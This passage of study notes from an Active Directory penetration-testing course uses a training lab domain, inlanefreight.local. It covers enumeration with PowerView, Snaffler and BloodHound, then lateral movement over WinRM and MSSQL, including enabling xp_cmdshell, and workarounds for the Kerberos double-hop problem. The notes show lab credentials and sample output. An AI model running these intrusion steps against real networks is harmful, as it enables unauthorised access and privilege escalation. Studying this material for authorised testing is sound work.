    - Start bloodhound GUI, then upload the data.
    - We can either upload each JSON file one by one or zip them first with a command such as `zip -r ilfreight_bh.zip *.json` and upload the Zip file.
    - [BloodHound Cypher cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)



## Credentialed Enumeration - from Windows
### ActiveDirectory PowerShell Module
- The ActiveDirectory PowerShell module is a group of PowerShell cmdlets for administering an Active Directory environment from the command line.
- The `Get-Module` cmdlet will list all available modules, their version, and potential commands for use. If the module is not loaded, run `Import-Module ActiveDirectory` to load it for use.


```powershell
# Get Domain Info
PS C:\htb> Get-ADDomain

```

- `Get-ADUser` cmdlet, we will be filtering for accounts with the `ServicePrincipalName` property populated. This will get us a listing of accounts that may be susceptible to a Kerberoasting attack.

```powershell
# Get-ADUser
PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Checking For Trust Relationships
PS C:\htb> Get-ADTrust -Filter *

# Group Enumeration
PS C:\htb> Get-ADGroup -Filter * | select name

# Detailed Group Info
PS C:\htb> Get-ADGroup -Identity "Backup Operators"

# Group Membership
PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"


```

- Utilizing the ActiveDirectory module on a host can be a stealthier way of performing actions than dropping a tool onto a host or loading it into memory and attempting to use it.

### PowerView
- The table below describes some of the most useful functions PowerView offers:

|Command|	Description|
|:------|:-------------|
|Export-PowerViewCSV|	Append results to a CSV file|
|ConvertTo-SID|	Convert a User or group name to its SID value|
|Get-DomainSPNTicket|	Requests the Kerberos ticket for a specified Service Principal Name (SPN) account|
|Domain/LDAP Functions:| |	
|Get-Domain|	Will return the AD object for the current (or specified) domain|
|Get-DomainController|	Return a list of the Domain Controllers for the specified domain|
|Get-DomainUser|	Will return all users or specific user objects in AD|
|Get-DomainComputer|	Will return all computers or specific computer objects in AD|
|Get-DomainGroup|	Will return all groups or specific group objects in AD|
|Get-DomainOU|	Search for all or specific OU objects in AD|
|Find-InterestingDomainAcl|	Finds object ACLs in the domain with modification rights set to non-built in objects|
|Get-DomainGroupMember|	Will return the members of a specific domain group|
|Get-DomainFileServer|	Returns a list of servers likely functioning as file servers|
|Get-DomainDFSShare|	Returns a list of all distributed file systems for the current (or specified) domain|
|GPO Functions:| |	
|Get-DomainGPO|	Will return all GPOs or specific GPO objects in AD|
|Get-DomainPolicy|	Returns the default domain policy or the domain controller policy for the current domain|
|Computer Enumeration Functions:| |	
|Get-NetLocalGroup|	Enumerates local groups on the local or a remote machine|
|Get-NetLocalGroupMember|	Enumerates members of a specific local group|
|Get-NetShare|	Returns open shares on the local (or a remote) machine|
|Get-NetSession|	Will return session information for the local (or a remote) machine|
|Test-AdminAccess|	Tests if the current user has administrative access to the local (or a remote) machine|
|Threaded 'Meta'-Functions:	| |
|Find-DomainUserLocation|	Finds machines where specific users are logged in|
|Find-DomainShare|	Finds reachable shares on domain machines|
|Find-InterestingDomainShareFile|	Searches for files matching specific criteria on readable shares in the domain|
|Find-LocalAdminAccess|	Find machines on the local domain where the current user has local administrator access|
|Domain Trust Functions:||	
|Get-DomainTrust|	Returns domain trusts for the current domain or a specified domain|
|Get-ForestTrust|	Returns all forest trusts for the current forest or a specified forest|
|Get-DomainForeignUser|	Enumerates users who are in groups outside of the user's domain|
|Get-DomainForeignGroupMember|	Enumerates groups with users outside of the group's domain and returns each foreign member|
|Get-DomainTrustMapping|	Will enumerate all trusts for the current domain and any others seen.|


```powershell
# Domain User Information
PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol


# Recursive Group Membership
PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Trust Enumeration
PS C:\htb> Get-DomainTrustMapping

# Testing for Local Admin Access
PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01


# Finding Users With SPN Set
PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

```


### SharpView
- Another tool worth experimenting with is SharpView, a .NET port of PowerView. Many of the same functions supported by PowerView can be used with SharpView.

```powershell
PS C:\htb> .\SharpView.exe Get-DomainUser -Help

```


### Snaffler
- [Snaffler](https://github.com/SnaffCon/Snaffler) is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment.
- Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories.
- Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment. 
- Snaffler requires that it be run from a domain-joined host or in a domain-user context.
```powershell
# Snaffler Execution
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data

# -s tells it to print results to the console for us 
# -d specifies the domain to search within
# -o tells Snaffler to write results to a logfile. 
# -v option is the verbosity level.

```


### BloodHound
- First, we must authenticate as a domain user from a Windows attack host positioned within the network (but not joined to the domain) or transfer the tool to a domain-joined host.

```powershell
# Running SharpHound Collector
PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT

```

- For running, type bloodhound into a CMD or PowerShell console



## Moving laterally or vertically in AD
### Privileged Access
- If we take over an account with local admin rights over a host, or set of hosts, we can perform a Pass-the-Hash attack to authenticate via the SMB protocol.

- There are several other ways we can move around a Windows domain:
    - Remote Desktop Protocol (RDP)
    - PowerShell Remoting
    - MSSQL Server



1. **Remote Desktop**
```powershell
# Enumerating the Remote Desktop Users Group
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN


```

- Using BloodHound:
    - Check what type of remote access rights they have either directly or inherited via group membership under `Execution Rights` on the `Node Info` tab.
    - Pre-built queries in Analysis tab `Find Workstations where Domain Users can RDP` or `Find Servers where Domain Users can RDP`


2. **WinRM**
```powershell
# Enumerating the Remote Management Users Group
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\forend
SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
IsGroup      : False
IsDomain     : UNKNOWN
```

- Using BloodHound:
    - Cypher query
    ```cypher
    MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
    ```

```powershell
# Establishing WinRM Session from Windows
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> hostname
ACADEMY-EA-MS01

# From our Linux attack host, we can use the tool evil-winrm to connect.
evil-winrm -i 10.129.201.234 -u forend
```

3. **SQL Server Admin**
- [Snaffler](#snaffler)
- BloodHound:
    - Check for `SQL Admin Rights` in the `Node Info` tab for a given user
    - Cypher query: `MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2`

- Authenticate to the SQL server using [PowerUpSQL cheat sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)

```powershell
# Enumerating MSSQL Instances with PowerUpSQL
PS C:\htb> cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain

ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
LastLogon        : 4/6/2022 11:59 AM

# Authenticate to the server & execute queries
PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

VERBOSE: 172.16.5.150,1433 : Connection Success.

Column1
-------
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...
```
- We can also authenticate from our Linux attack host using [mssqlclient.py](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) from the Impacket toolkit.
```bash
# Running mssqlclient.py Against the Target
abdeonix@htb[/htb]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands

```
- `enable_xp_cmdshell` to enable the xp_cmdshell stored procedure which allows for one to execute operating system commands via the database.
```SQL
# Choosing enable_xp_cmdshell
SQL> enable_xp_cmdshell

```

- Now, run commands in the format `xp_cmdshell <command>`
```SQL
# Enumerating our Rights on the System using xp_cmdshell
xp_cmdshell whoami /priv
output                                                                             

--------------------------------------------------------------------------------   

NULL                                                                               

PRIVILEGES INFORMATION                                                             

----------------------                                                             

NULL                                                                               

Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   

```

### Kerberos "Double Hop" Problem
![Double Hop](/images/double_hop.jpg)

- When we connect to `DEV01` using a tool such as `evil-winrm`, we connect with network authentication (using Kerberos), so our credentials are not stored in memory and, therefore, will not be present on the system to authenticate to other resources on behalf of our user.
- **Why does this happen?**
    - Kerberos: When you authenticate with Kerberos, you don't send your password; instead, you get a special "ticket" (TGS) from a central system (called the KDC) that says, "You're allowed to access this machine." But this ticket is only valid for the machine you connected to (`DEV01`). It won't work for Machine `DC01`.
    - NTLM: When you authenticate with a password or NTLM hash (e.g., using tools like PSExec), the hash is temporarily stored in memory on `DEV01`. This allows it to be reused to access Machine `DC01`.

> [!NOTE]
> **Exception:** Unconstrained Delegation
> If `DEV01` has unconstrained delegation enabled, things change:
> 
> 1. When you log into `DEV01`, both your TGS ticket and your TGT ticket are sent and cached on the server.
> Now, `DEV01` can act on your behalf because it has your TGT.
> 2. It can request new TGS tickets to access other resources in the domain, like Active Directory or another server.
> 3. In simple terms: With unconstrained delegation, the server you log into gets "full power" to impersonate you across the network. so if you find a server with unconstrained delegation, it’s a **jackpot**.

- **[Workarounds](https://posts.slayerlabs.com/double-hop/)**
    1. Workaround #1: PSCredential Object
        - Set up a PSCredential object to pass our credentials again.
    ```bash
    *Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1

    # Setup our authentication
    *Evil-WinRM* PS C:\Users\backupadm\Documents> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force

    *Evil-WinRM* PS C:\Users\backupadm\Documents>  $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
    
    # We can pass creds in commands
    *Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname
 
    ```

    2. Workaround #2: Register PSSession Configuration
        ```powershell
        # Establishing WinRM session on the remote host
        PS C:\htb> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm

        [ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> Import-Module .\PowerView.ps1

        # Registering a new session configuration using the Register-PSSessionConfiguration cmdlet.
        PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm

        ```
        - Once this is done, we need to restart the WinRM service by typing `Restart-Service WinRM` in our current PSSession.

        ```powershell
        PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess

        ```

> [!WARNING]
> You can't use Register-PSSessionConfiguration from an evil-winrm shell because:
> - It requires a credentials popup, which isn't possible in a shell-only session.
> - Even if you pass credentials manually, it needs an elevated PowerShell terminal (`RunAs`), which evil-winrm doesn't provide.
> Additionally, running this from Linux (like Parrot or Ubuntu) often fails because Linux PowerShell doesn't handle Kerberos credentials the same way.
> 
> This method is still highly effective if we use Windows attack host or compromise a machine with RDP access to act as a "jump host" for further attacks.


